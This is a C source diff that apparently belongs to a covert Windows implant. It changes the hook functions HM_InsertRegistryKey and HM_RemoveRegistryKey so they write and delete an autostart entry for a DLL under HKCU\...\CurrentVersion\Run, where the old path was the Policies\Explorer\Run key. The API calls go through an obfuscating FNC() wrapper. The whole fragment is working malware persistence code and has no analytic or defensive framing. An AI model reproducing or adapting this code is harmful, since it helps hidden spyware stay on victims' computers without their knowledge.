@@ -1937,7 +1937,8 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 	// Se vuole forzarla, non interessa vedere se c'e' gia'
 	if (!force_insert) {
 		DWORD ktype;
-		if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) == ERROR_SUCCESS) {
+		// XXX-NEWREG
+		if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
 			if (FNC(RegQueryValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, &ktype, NULL, NULL) == ERROR_SUCCESS) {
 				// La chiave c'e' gia'
 				FNC(RegCloseKey)(hOpen);
@@ -1989,14 +1990,16 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 		FNC(RegCloseKey)(hOpen);
 	}
 #else
-	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) == ERROR_SUCCESS) {
+	// XXX-NEWREG
+	if (FNC(RegOpenKeyA)(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
 		if (FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1) == ERROR_SUCCESS){
 			FNC(RegCloseKey)(hOpen);
 			return;
 		}
 		FNC(RegCloseKey)(hOpen);
 	}
-	if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) == ERROR_SUCCESS) {
+	// XXX-NEWREG
+	if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
 		FNC(RegSetValueExA)(hOpen, REGISTRY_KEY_NAME, NULL, REG_EXPAND_SZ, (unsigned char *)key_value, strlen(key_value)+1);		
 		FNC(RegCloseKey)(hOpen);
 	}
@@ -2026,7 +2029,8 @@ void HM_RemoveRegistryKey()
 		FNC(RegDeleteValueA) (hOpen, OLD_REGISTRY_KEY_NAME);
 		FNC(RegCloseKey)(hOpen);
 	}
-	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) == ERROR_SUCCESS) {
+	// XXX-NEWREG
+	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
 		FNC(RegDeleteValueA) (hOpen, REGISTRY_KEY_NAME);
 		FNC(RegCloseKey)(hOpen);
 	}
